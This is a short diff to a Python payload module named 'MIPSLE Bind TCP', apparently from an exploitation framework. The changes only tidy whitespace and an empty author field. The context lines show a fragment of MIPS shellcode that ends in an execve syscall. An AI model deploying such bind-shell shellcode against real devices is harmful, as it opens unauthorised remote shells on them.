@@ -9,9 +9,8 @@ class Exploit(payloads.Payload):
     __info__ = {
         'name': 'MIPSLE Bind TCP',
         'authors': [
-			'',
         ],
-        'description': '', 
+        'description': '',
         'references': [
         ],
     }
@@ -87,4 +86,3 @@ class Exploit(payloads.Payload):
             "\xab\x0f\x02\x24" +        # li v0,4011 ( __NR_execve )
             "\x0c\x01\x01\x01"          # syscall 0x40404
         )
-
